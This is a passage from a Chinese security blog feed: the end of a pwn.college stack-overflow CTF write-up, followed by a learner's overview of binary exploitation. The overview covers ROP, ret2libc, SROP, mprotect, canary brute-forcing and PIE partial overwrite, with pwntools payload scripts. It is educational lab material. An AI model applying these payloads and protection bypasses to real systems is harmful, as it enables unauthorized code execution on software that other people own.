src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/checksec.png"><br>说明不能往栈上写shellcode<br><br>同时，观察左侧函数名一栏存在一个win函数，点进去看一下，发现是输出flag的功能，如图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/win.png"><br>至此，漏洞点就清晰了，我们需要覆盖返回地址为win函数的地址，劫持challenge函数的控制流</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先需要确定缓冲区到返回地址的偏移，记录两种方法：<br><br>第一个是通过IDA，注意challenge函数反编译的截图，在第5行buf变量后面有一个[rbp-80H]的字段，联系栈帧结构，可以知道返回地址在缓冲区的高0x80+0x8&#x3D;136字节处<br><br>第二个是通过gdb的pwndbg插件：<br><br>首先在gdb中运行反汇编命令，拿到challenge函数的ret指令的地址<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">disas challenge<br></code></pre></td></tr></table></figure><p><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-1.png"><br>可以看到在challenge函数+289位置，那么就在ret处打上断点<br><br>之后通过cyclic生成模式字符串，将该字符串作为输入，如下图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-2.png"><br>最后通过cyclic -l命令，查找rsp指向的字符串的偏移，即是返回地址的偏移<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-3.png"><br>之后确定win函数地址，由于没有开启PIE，可以采用objdump命令进行反汇编，直接拿到win的地址<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d /challenge/binary-exploitation-control-hijack<br></code></pre></td></tr></table></figure><p><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/objdump.png"><br>可以看到win函数在0x401c20的地方<br><br>因此可以编写出如下利用脚本了<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>ioHandler=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-control-hijack&quot;</span>)<br>offset=<span class="hljs-number">136</span><br>winAddr=<span class="hljs-number">0x401c20</span><br>ioHandler.recvuntil(<span class="hljs-string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(winAddr)<br>ioHandler.send(payload)<br>flag=ioHandler.recvall().decode()<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>直接运行即可拿到flag了<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>二进制总结</title>
    <link href="/2025/07/19/TogetherReview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%BB%E7%BB%93/"/>
    <url>/2025/07/19/TogetherReview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这一篇博客会把二进制利用的知识串起来，同时穿插pwn.college和其他CTF的题解，帮助自己理解和巩固。<br></p><span id="more"></span><p>内容会随着博主掌握的内容而更新，目前只到ROP部分（基本对应pwn.college上的intro&#x2F;Binary Exploitation以及program security 的ROP部分，堆还一点不会，哎哎……）<br><br>当然博主也是新手，有写错的地方勿怪<br><br>（声明：这篇博客所有记录默认是以64位架构为前提）</p><h1 id="基础部分随记"><a href="#基础部分随记" class="headerlink" title="基础部分随记"></a>基础部分随记</h1><h2 id="栈结构与函数调用"><a href="#栈结构与函数调用" class="headerlink" title="栈结构与函数调用"></a>栈结构与函数调用</h2><p>首先个人觉得做二进制的题目，最基本的是需要了解栈结构。<br><br><em><strong>栈的内存空间是从高地址向低地址增长，也就是说，每当有东西进栈，rsp将会-1，每当有东西出栈，rsp将会+1</strong></em><br><br>每个函数在调用的过程中会维护自己的一块在栈上的内存空间，被称为栈帧；<br><br><em><strong>函数在被调用时，首先会进行传参，但是否传入栈上，得看架构和参数个数；比如根据64位系统调用约定，前6个参数依次从rdi、rsi、rdx、rcx、r8、r9中读取，返回值保存在rax中。因此当参数个数超过6个，才通过栈传参（当然32位就是全用栈传参）</strong></em><br><em><strong>传参完成后会将下一条指令的地址压栈，即push rip，该地址被称为返回地址，这个动作由call指令自动完成</strong></em><br><br><em><strong>接下来会进入函数的所谓“序言”部分，即执行：压rbp入栈（push rbp）-&gt;把rsp的值赋给rbp（mov rbp,rsp）-&gt;rsp向低地址移动（sub rsp）</strong></em><br><br>（备注：后续回顾时重点理解函数被调用时的进栈流程，和leave ret对应起来理解）<br><br>此时，函数的栈帧已经形成，栈的最高处是调用者的rbp，最低处是rsp，函数运行时的局部变量存在栈帧的靠近低处<br><br>从rbp到局部变量，中间的内容需要具体分析，可能会有canary等数据<br><br>综上，可以画出栈的一个示意图如下：<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/stack.png"><br>函数调用结束后，一般末尾会有leave和ret指令，这两条指令的等价形式如下：<br><br><em><strong>leave&#x3D;mov rsp,rbp;pop rbp，ret &#x3D;pop rip</strong></em><br><em><strong>此时可以发现，这些操作正好对应着函数序言，即可以理解为序言的反操作，这也就是为什么函数在调用过后还能回到原来的地方继续执行（返回地址实现），同时调用者的栈帧也能恢复（rbp的入栈出栈实现）</strong></em></p><h2 id="缓冲区溢出攻击原理"><a href="#缓冲区溢出攻击原理" class="headerlink" title="缓冲区溢出攻击原理"></a>缓冲区溢出攻击原理</h2><p>分析上述栈结构和函数调用过程，可以发现局部变量（用户输入的缓冲区）是在返回地址下方，而用户输入是不可控的，如果没有长度校验，可以通过构造过长的输入去覆盖返回地址，从而劫持函数的执行流<br><br>当然，不一定所有题目都是覆盖返回地址，但目前遇到的还是以控制流劫持类型居多，因此主要记录这种；其他方法的例题本片文章也有收录，如覆盖关键校验值<br><br>最后一个问题：返回地址应该覆盖为什么？根据目前做题经验，总结为以下2类：<br></p><h3 id="后门函数的地址"><a href="#后门函数的地址" class="headerlink" title="后门函数的地址"></a>后门函数的地址</h3><p>后门函数在题目中一般表现为可以读取、输出flag的函数，或者是直接调用system()等可以获得shell的函数<br><br>如果给的二进制文件中存在这类函数（通过逆向等手段发现），可以优先考虑覆盖返回地址为该函数的地址<br></p><h3 id="shellcode的起始地址"><a href="#shellcode的起始地址" class="headerlink" title="shellcode的起始地址"></a>shellcode的起始地址</h3><p>shellcode即可以帮助攻击者获取shell的代码，当二进制文件本身不存在后门函数的时候，就需要攻击者自己编写shellcode（或重用程序已有的代码段），并将其溢出到程序内存中（可以是栈、.bss段、数据段等）<br><br>具体实现方法为通过编写汇编语言代码，调用system、execve等函数开启shell。由于python强大的pwn包，现在可以直接使用该模块生成一般的shellcode<br></p><h2 id="溢出攻击的防御手段与克制方法"><a href="#溢出攻击的防御手段与克制方法" class="headerlink" title="溢出攻击的防御手段与克制方法"></a>溢出攻击的防御手段与克制方法</h2><p>目前博主在做题当中遇到的主要会阻碍我们的防御手段就是以下3种（后面遇到了别的再记录）：<br></p><h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h3><p>NX保护即指定栈不可执行，该保护主要用于防御直接往栈上写shellcode的攻击方式<br><br>为了克制NX保护，目前学到的有以下2种方法：ROP和mprotect函数<br></p><h3 id="克制NX保护——ROP攻击"><a href="#克制NX保护——ROP攻击" class="headerlink" title="克制NX保护——ROP攻击"></a>克制NX保护——ROP攻击</h3><p>当开启了NX保护，栈上的数据将不可以被视作代码来执行，因此直接写shellcode行不通<br><br>那该怎么办？很简单，自己写的不让执行，那就用程序本身有的，毕竟一个程序，总是有可以执行的代码块的，不然写出来干啥呢？<br><br>但是，另一个问题，想要getshell用到的代码块可能散布在程序各个地址，不会老老实实连续（指物理上的连续）放在一起，所以只覆盖一个返回地址肯定不行<br><br>此时，注意到ret指令实质是pop rip，因此，只要找的每一块指令碎片都以ret或者pop rip或者其他可以修改rip的指令结尾，那这个片段就可以使用<br><br>因此，可以把ROP看成一种特殊的shellcode，这段shellcode和传统意义上的不同，物理上并不是连续存储在内存中，而是分散开来的指令碎片<br><br>每块碎片就像链表的结点，结点之间通过ret（或其他修改rip的指令）连接，通过这种方式，实现逻辑上好像执行了一段连续的shellcode，而攻击者要做的，就是把第一块指令碎片（表头）的地址覆盖到返回地址<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/ROP-example.png"><br>如上图，假设现在返回地址已经被覆盖为了第1块指令碎片的地址，并且函数下一条指令为ret<br><br>那么，一旦函数执行ret（即pop rip），会将rip的地址变成指令碎片的起始地址（即0x123，只是假设的地址，真正应该不会这么低），然后把rsp+1<br><br>因此rsp就会指向指令碎片2的地址，一旦碎片1执行完毕，由于最后一个指令是ret，同样会执行上述操作，从而rsp再指向碎片3的地址<br><br>……………………直到所有的指令碎片执行完毕，拿到shell<br><br>目前遇到的ROP题目大致分为两类：<br><br>第一是ret2text，即回到程序本身的代码段，该方法适用于程序自身的指令碎片比较丰富，有着大量可用的指令，如system、&#x2F;bin&#x2F;sh等，通过返回到这些指令的地址获得shell<br><br>第二是ret2libc，即回到libc中；因为一个动态链接程序（为减小可执行文件体积，现在大部分都是动态链接文件，如果遇到静态的，就又回到了第一种类型）在运行时会装载libc.so文件；<br><br>libc.so是一个共享文件（不准确的说，可以看成windows下的dll），这个文件里存储了大量的C库函数，因此这里面必定存在我们想要的system和”&#x2F;bin&#x2F;sh”字符串<br><br>但是，.so文件一定是PIE的，因此在ret2libc时，最关键的步骤是获取libc在装载时的基地址，最基本的思路是通过程序中调用的函数的got表泄露<br><br>再简单说一下got表和plt表以及Linux的延迟绑定机制<br><br>简单来说，程序在调用libc中的函数时，第一次调用时会解析该函数的真实地址并存储在got表里，后续第2次第3次调用时直接去got表拿地址，简单的示意图如下：<br><br>第一次调用时会进行如下流程<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/lazy-binding-1.png"><br>之后每次调用则如下图所示<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/lazy-binding-2.png"><br>因此，可以看出，只要泄露了某个函数的got表的地址，再减去其在libc里的偏移，即可得到其真实地址（只要给定libc版本，偏移就是确定的，可以通过readelf命令行工具或者python的pwn模块获取）<br><br>同时，从上面讨论可以看出，必须要泄露程序中被调用过的函数的got表，才能获得libc基址，因此个人常选择__libc_start_main函数，这是一个在启动main时必定会被调用的函数<br></p><h4 id="ROP之栈跃迁"><a href="#ROP之栈跃迁" class="headerlink" title="ROP之栈跃迁"></a>ROP之栈跃迁</h4><p>待补充……</p><h4 id="SROP方法"><a href="#SROP方法" class="headerlink" title="SROP方法"></a>SROP方法</h4><p>1.Linux信号机制：<br><br>信号可以简单理解为一种软中断，是进程之间传递信息的一种方式，在传递信号时大致过程如下图所示：<br><br><img src="/../../photos/TogetherReview/Pwn/sig-handle-proc.png"><br>上图可以简单概括为以下步骤：<br><br>(1)用户进程接收到信号后，会陷入内核态，之后由内核为该进程保存上下文（可以简单理解为将所有寄存器压栈），之后会在 <em><strong>用户进程的栈上</strong></em> 构造一个叫做Signal Frame的结构体，如下图所示：<br><br><img src="/../../photos/TogetherReview/Pwn/signal-frame.png"><br>图中的uncontext和siginfo被称为Signal Frame，这里面保存了大量用户进程寄存器的值，并且该结构体保存在 <em><strong>用户进程的栈上</strong></em> ，该结构体的具体定义在64位和32位下有所不同，分别如下：<br><br>64位：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs, __gsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs, __fsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> es, __esh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ds, __dsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ecx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eax;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eip;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs, __csh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp_at_signal;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ss, __ssh;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>&#125;;<br></code></pre></td></tr></table></figure><p>32位：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span><br>  <span class="hljs-type">__uint16_t</span>        cwd;<br>  <span class="hljs-type">__uint16_t</span>        swd;<br>  <span class="hljs-type">__uint16_t</span>        ftw;<br>  <span class="hljs-type">__uint16_t</span>        fop;<br>  <span class="hljs-type">__uint64_t</span>        rip;<br>  <span class="hljs-type">__uint64_t</span>        rdp;<br>  <span class="hljs-type">__uint32_t</span>        mxcsr;<br>  <span class="hljs-type">__uint32_t</span>        mxcr_mask;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpxreg</span>    _<span class="hljs-title">st</span>[8];</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">xmmreg</span>    _<span class="hljs-title">xmm</span>[16];</span><br>  <span class="hljs-type">__uint32_t</span>        padding[<span class="hljs-number">24</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__uint64_t</span> r8;<br>  <span class="hljs-type">__uint64_t</span> r9;<br>  <span class="hljs-type">__uint64_t</span> r10;<br>  <span class="hljs-type">__uint64_t</span> r11;<br>  <span class="hljs-type">__uint64_t</span> r12;<br>  <span class="hljs-type">__uint64_t</span> r13;<br>  <span class="hljs-type">__uint64_t</span> r14;<br>  <span class="hljs-type">__uint64_t</span> r15;<br>  <span class="hljs-type">__uint64_t</span> rdi;<br>  <span class="hljs-type">__uint64_t</span> rsi;<br>  <span class="hljs-type">__uint64_t</span> rbp;<br>  <span class="hljs-type">__uint64_t</span> rbx;<br>  <span class="hljs-type">__uint64_t</span> rdx;<br>  <span class="hljs-type">__uint64_t</span> rax;<br>  <span class="hljs-type">__uint64_t</span> rcx;<br>  <span class="hljs-type">__uint64_t</span> rsp;<br>  <span class="hljs-type">__uint64_t</span> rip;<br>  <span class="hljs-type">__uint64_t</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>  <span class="hljs-type">__uint64_t</span> err;<br>  <span class="hljs-type">__uint64_t</span> trapno;<br>  <span class="hljs-type">__uint64_t</span> oldmask;<br>  <span class="hljs-type">__uint64_t</span> cr2;<br>  __extension__ <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>      <span class="hljs-type">__uint64_t</span> __fpstate_word;<br>    &#125;;<br>  <span class="hljs-type">__uint64_t</span> __reserved1 [<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2)转向信号处理函数<br><br>(3)执行sigreturn，即上述栈视图的最底部，这是一个系统调用（x86_64下调用号&#x3D;15，x64下调用号&#x3D;77），会将保存的寄存器逐个pop回去，然后跳转到rip接着执行用户进程<br><br>2.利用方法：<br><br>注意到上文在介绍Signal Frame的时候提到，这个结构体是保存在用户栈上的，因此如果能够溢出，则可以在栈上伪造一个Signal Frame（对应第一张图里的3号箭头，在restroe时欺骗内核恢复到假的寄存器值）；<br><br>之后通过劫持程序控制流首先到sigreturn系统调用，在返回时最终执行rip里我们想要执行的shellcode（对应第一张图里的4号箭头，由于rip是假的，因此会从内核返回到假的地址）<br><br>例如，可以如下图所示，构造假的Signal Frame从而使得sigreturn返回时执行execve：<br><br><img src="/../../photos/TogetherReview/Pwn/fake-signal-frame.png"></p><h3 id="克制NX保护——mprotect函数"><a href="#克制NX保护——mprotect函数" class="headerlink" title="克制NX保护——mprotect函数"></a>克制NX保护——mprotect函数</h3><p>mprotect函数是C语言的一个用来修改内存区段权限的函数，该函数原型如下：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span><br></code></pre></td></tr></table></figure><p>其中，void* addr指向需要修改的内存段的起始地址；size_t len表示内存区段的长度（字节为单位）<br><br>prot表示期望赋予该内存段的权限，其中0表示无法访问，1表示可读，3表示可读可写，7表示可读可写且可执行<br><br>从上面的函数原型可以看出，通过mprotect函数可以将原本受到NX限制而不可执行的堆栈空间强行赋权为可执行<br><br>在实际使用中，还有以下2个小的注意点：<br><br>1 如何确定是否可以使用mprotect函数：当发现目标二进制文件是静态链接时，大概率会存在mprotect函数<br><br>2 mprotect的参数设置：mprotect函数标准规定，addr必须是一个内存页的起点，换句话说，addr的最后12位必须&#x3D;全0；同时，len必须是页大小的整数倍，即k*4096；最后，在实际做题中，为保险起见，常赋予目标内存段最高权限，因此prot一般置为7</p><h3 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h3><p>canary即在rbp的下方放置一个随机数，并在安全位置保存该随机数的副本，退栈时比对副本和读取到的随机数，如果不一样说明发生了溢出攻击<br></p><h3 id="克制canary保护"><a href="#克制canary保护" class="headerlink" title="克制canary保护"></a>克制canary保护</h3><p>第一种方法是直接泄露canary的值，该方法需要程序本身有输出内存中的值的功能，或者攻击者能调用输出函数输出内存值<br><br>另一种方法是爆破：canary的第一个字节一定是0x00，这是为了截断字符串读取，防止canary泄露而设计，但这种设计也为canary的爆破提供了方便<br><br>只需要从第一个字节0x00开始，逐个字节的尝试，如果猜测正确，程序会正常执行，否则会出现异常（如输出”stack smashing detected”），最坏情况尝试256*7次，如下图所示<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/anti-canary.jpg"></p><h3 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h3><p>PIE全称为位置无关可执行文件，开启了这个保护的程序，每次运行时将被加载到不同的基地址，因此程序里所有的指令地址在运行前都无法确定<br><br>换句话说，通过objdump反汇编看到的指令地址、函数起始地址，都是偏移量，不能直接使用<br></p><h3 id="克制PIE保护"><a href="#克制PIE保护" class="headerlink" title="克制PIE保护"></a>克制PIE保护</h3><p>尽管存在PIE，但由于操作系统需要页对齐，即每页大小4096字节，而4096正好&#x3D;0x1000，因此返回地址的最后12位（或者说最后一个半字节是确定的）<br><br>由此，为了克制PIE，可以采取低字节部分覆盖的攻击方法，只覆盖最后两个字节，其中只有一个16位数不确定，因此尝试16次即可<br><br>综上，当实际做题时，首要步骤应该是使用checksec命令去检查程序的保护措施，如下图：<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/checksec-example.png"><br>这个程序是保护全关，但是看到哪种保护开启了，其实也是变相在提示解题思路<br><br>比如看到NX就知道栈上写shellcode的方法肯定废了，应该要ROP，或者有后门函数？看到canary和PIE，想到要爆破，或者想办法泄露一个基地址？</p><h2 id="其他琐碎知识点"><a href="#其他琐碎知识点" class="headerlink" title="其他琐碎知识点"></a>其他琐碎知识点</h2><h3 id="C程序启动过程——重新认识main函数"><a href="#C程序启动过程——重新认识main函数" class="headerlink" title="C程序启动过程——重新认识main函数"></a>C程序启动过程——重新认识main函数</h3><p>做题时发现对程序的启动以及main函数的加载退出机制不是很了解，严重影响做题，遂做一下记录<br><br>首先，main并不是程序真正的起点，在main函数之前，需要由_start函数去调用__libc_start_main，_start并不是开发者写在代码里的一个函数，而是编译时生成<br><br>将任意一个ELF文件拖入IDA，可以看到_start函数内部的样子如图所示<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/start.png"><br>接下来说一下__libc_start_main，这是一个libc动态连接库(.so文件，即shared object)中的函数，它才是真正完成启动程序，设置寄存器值，调用main这一系列任务的函数<br><br>通过将.so文件拖到IDA里，同样能看到__libc_start_main如图所示<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/libc-start-main.png"><br>如上图，从0x2402D处开始，__libc_start_main在为main函数启动做一系列准备，最后，在call rax处真正启动main函数<br><br>接着梳理main函数的退出机制，即return 0;之后究竟做了什么<br><br>还是看到上图逆向libc.so的结果，可以在0x24083处看到这样的指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mov     edi, eax<br>call    <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><p>回想64位系统的调用约定和传参约定，这两条指令实际上说明，当main函数退出时，会把返回值（一般是0）作为exit的参数从rax传递给rdi。紧接着下一条指令调用exit<br></p><h3 id="32位程序的传参问题"><a href="#32位程序的传参问题" class="headerlink" title="32位程序的传参问题"></a>32位程序的传参问题</h3><p>从栈结构与函数调用一节中可以得知，32位程序传参一定是通过栈进行，并且参数会被调用者布置在返回地址的上方<br><br>当调用者布置完参数后，会通过call指令调用目标函数，具体来说，call指令会做以下2件事：<br><br>1 push eip，即保存返回地址到栈上<br><br>2 jmp ，即根据call后面的地址，跳转到那里执行那里的代码块<br><br>从上面的call过程，可以看出，正常情况下，32位程序中的被调用函数，会从ebp+8位置开始寻找参数（因为ebp+4是约定好的返回地址，返回地址再往上一格才是参数），如下图所示：<br><br><img src="/../../photos/TogetherReview/Pwn/stack-32_bit-normal.png"><br>这样一来，在实际做题时就要注意一下参数的布置了<br><br>因为做题时是通过溢出返回地址从而劫持控制流，导致跳转时相比正常的call，缺少了第一步——push eip，如下图所示：<br><br><img src="/../../photos/TogetherReview/Pwn/stack-32_bit-overflow.png"><br>从上述两张栈布局示意图可以看到，当实现溢出时，如果在payload中直接将参数填在返回地址后面，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p32(winAddr)+p32(argc)<br></code></pre></td></tr></table></figure><p>由于缺少一个push eip的操作，导致argc被布置在winAddr的上方（即上述第二张图的？？？位置），但cpu不管这些，他会误认为argc是返回地址，从而去argc上方4个字节处取参数，这就显然和预期的不符了<br><br>所以，正确的payload构造应该如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p32(winAddr)+p32(<span class="hljs-number">0</span>)+p32(argc)<br></code></pre></td></tr></table></figure><p>即通过填入4个字节的垃圾数据，使得cpu能正确找到我们想要的参数<br><br>这是针对单阶段，如果在winAddr后面还想返回到别的函数怎么办？（常见于泄露libc基址，需要在第一阶段最后返回到main）<br><br>也很简单，只要把脏数据变成想要的地址即可（实质上等价于通过溢出实现push eip的操作），比如，泄露libc时：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>gotAddr=elf.got[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br>payload1=p32(pltAddr)+p32(startAddr)+p32(gotAddr)<br></code></pre></td></tr></table></figure><h1 id="题目实例"><a href="#题目实例" class="headerlink" title="题目实例"></a>题目实例</h1><h2 id="pwn-college基本例题"><a href="#pwn-college基本例题" class="headerlink" title="pwn.college基本例题"></a>pwn.college基本例题</h2><h3 id="劫持到后门函数"><a href="#劫持到后门函数" class="headerlink" title="劫持到后门函数"></a>劫持到后门函数</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/">pwn.college题解：Control-Hijack</a><br><br>（备注：可以通过该题目了解最基本的栈溢出该怎么利用，以及各种工具的基本使用）</p><h3 id="劫持到shellcode"><a href="#劫持到shellcode" class="headerlink" title="劫持到shellcode"></a>劫持到shellcode</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/">pwn.college题解：Hijack-to-Shellcode</a></p><h3 id="基础ROP"><a href="#基础ROP" class="headerlink" title="基础ROP"></a>基础ROP</h3><ol><li>ret2text：<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-3/">pwn.college题解：ROP-level3</a></li><li>ret2libc：<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/">pwn.college题解：ROP-level4</a></li></ol><h3 id="克制PIE"><a href="#克制PIE" class="headerlink" title="克制PIE"></a>克制PIE</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/">pwn.college题解：PIEs-hard</a></p><h3 id="克制canary"><a href="#克制canary" class="headerlink" title="克制canary"></a>克制canary</h3><ol><li>直接泄露方式：<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-13/">pwn.college题解：ROP-level-13</a><br></li><li>爆破方式：<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-14-and-15/">pwn.college题解：ROP-level-14-and-15</a></li></ol><h2 id="一些trick"><a href="#一些trick" class="headerlink" title="一些trick"></a>一些trick</h2><h3 id="消除shellcode的零字节"><a href="#消除shellcode的零字节" class="headerlink" title="消除shellcode的零字节"></a>消除shellcode的零字节</h3><p>具体的题目实例见<a 